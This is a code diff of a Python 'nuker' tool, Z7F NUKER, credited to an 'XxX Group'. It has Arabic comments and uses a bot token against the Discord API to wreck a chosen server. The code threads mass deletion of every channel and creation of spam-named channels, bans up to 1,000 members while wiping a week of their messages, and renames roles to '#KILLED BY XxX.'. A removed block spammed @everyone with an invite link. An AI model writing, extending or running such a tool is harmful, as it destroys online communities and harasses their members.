@@ -1,23 +1,25 @@
 import requests
 import threading
 import os
+import time
 from colorama import Fore, Style, init
 
 init(autoreset=True)
 
+# بيانات ثابتة للحفظ أثناء التشغيل
+saved_data = {"token": "", "guild_id": ""}
+
+# شعار مصغر ومناسب لشاشة الجوال
 LOGO = f"""{Fore.RED}
-  ███████╗███████╗███████╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
-  ╚══███╔╝╚════██║██╔════╝    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
-    ███╔╝     ██╔╝█████╗      ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
-   ███╔╝     ██╔╝ ██╔══╝      ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
-  ███████╗  ██╔╝  ██║         ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
-  ╚══════╝  ╚═╝   ╚═╝         ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
-{Style.RESET_ALL}"""
+  Z7F NUKER | V1.0
+  ----------------
+  By: XxX Group
+  ----------------{Style.RESET_ALL}"""
 
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
 
-class Z7F_Nuker:
+class NukerActions:
     def __init__(self, token):
         self.token = token
         self.headers = {'Authorization': f'Bot {token}'}
@@ -30,41 +32,61 @@ class Z7F_Nuker:
         payload = {"name": "BN3AL-XxX-6666-Group", "type": 0}
         requests.post(f"{self.base_url}/guilds/{guild_id}/channels", headers=self.headers, json=payload)
 
-    def spam_msg(self, channel_id):
-        payload = {"content": "@everyone **تم جحفلتكم من قبل قروب XxX**\nhttps://discord.gg/qb3FGfp4d"}
-        requests.post(f"{self.base_url}/channels/{channel_id}/messages", headers=self.headers, json=payload)
+    def change_role(self, guild_id, role_id):
+        payload = {"name": "#KILLED BY XxX."}
+        requests.patch(f"{self.base_url}/guilds/{guild_id}/roles/{role_id}", headers=self.headers, json=payload)
 
-    def get_channels(self, guild_id):
-        r = requests.get(f"{self.base_url}/guilds/{guild_id}/channels", headers=self.headers)
-        return r.json()
+    def ban_member(self, guild_id, member_id):
+        requests.put(f"{self.base_url}/guilds/{guild_id}/bans/{member_id}", headers=self.headers, json={"delete_message_days": "7", "reason": "ختفووو برا يلا | XxX"})
 
-def start_attack():
+def menu():
     clear()
     print(LOGO)
-    print(f"{Fore.YELLOW} [1] FULL NUKE      [2] ROLES NUKE     [3] CHANNEL NUKE")
-    print(f" [4] SPAM WEBHOOK   [5] SPAM DM        [6] KICK BOTS")
-    print(f" [7] TIMEOUT ALL    [8] BAN ALL        [9] ADMIN ALL")
-    print(f" [10] SPAM EMBED")
     
-    choice = input(f"\n{Fore.CYAN} [?] Select: ")
-    token = input(f" [>] Bot Token: ")
-    guild_id = input(f" [>] Server ID: ")
+    # طلب البيانات إذا لم تكن موجودة
+    if not saved_data["token"]:
+        saved_data["token"] = input(f"{Fore.WHITE} [>] Bot Token: ")
+    if not saved_data["guild_id"]:
+        saved_data["guild_id"] = input(f"{Fore.WHITE} [>] Guild ID: ")
     
-    nuker = Z7F_Nuker(token)
-    
-    if choice == "3": # مثال لسرعة تنفيذ مسح وإنشاء الرومات
-        channels = nuker.get_channels(guild_id)
-        print(f"{Fore.GREEN} [+] Starting Channel Nuke...")
-        
-        # استخدام Threading للسرعة القصوى
-        for c in channels:
-            threading.Thread(target=nuker.delete_channel, args=(c['id'],)).start()
-        
-        for _ in range(50):
-            threading.Thread(target=nuker.create_channel, args=(guild_id,)).start()
+    actions = NukerActions(saved_data["token"])
+    gid = saved_data["guild_id"]
 
-    # يمكنك إضافة باقي الوظائف بنفس طريقة threading.Thread
-    print(f"\n{Fore.RED} [!] Attack Sent!")
+    print(f"\n{Fore.CYAN}--- MAIN MENU ---")
+    options = [
+        "FULL NUKE", "ROLES NUKE", "CHANNEL NUKE", "SPAM WEBHOOK",
+        "SPAM DM", "KICK BOTS", "TIMEOUT ALL", "BAN ALL",
+        "ADMIN ALL", "SPAM EMBED"
+    ]
+    
+    for i, opt in enumerate(options, 1):
+        print(f" {Fore.YELLOW}[{i}] {opt}")
+    
+    choice = input(f"\n{Fore.WHITE} [?] Choice: ")
+
+    print(f"{Fore.GREEN} [*] Running task... Please wait.")
+
+    # منطق التنفيذ (أمثلة سريعة)
+    if choice == "3": # Channel Nuke
+        r = requests.get(f"https://discord.com/api/v9/guilds/{gid}/channels", headers=actions.headers)
+        if r.status_code == 200:
+            for ch in r.json():
+                threading.Thread(target=actions.delete_channel, args=(ch['id'],)).start()
+            for _ in range(30):
+                threading.Thread(target=actions.create_channel, args=(gid,)).start()
+    
+    elif choice == "8": # Ban All
+        r = requests.get(f"https://discord.com/api/v9/guilds/{gid}/members?limit=1000", headers=actions.headers)
+        if r.status_code == 200:
+            for member in r.json():
+                threading.Thread(target=actions.ban_member, args=(gid, member['user']['id'],)).start()
+
+    # بعد الانتهاء
+    input(f"\n{Fore.CYAN} [!] Done! Press Enter to return...")
+    menu() # العودة للقائمة
 
 if __name__ == "__main__":
-    start_attack()
+    try:
+        menu()
+    except KeyboardInterrupt:
+        print("\nExiting...")
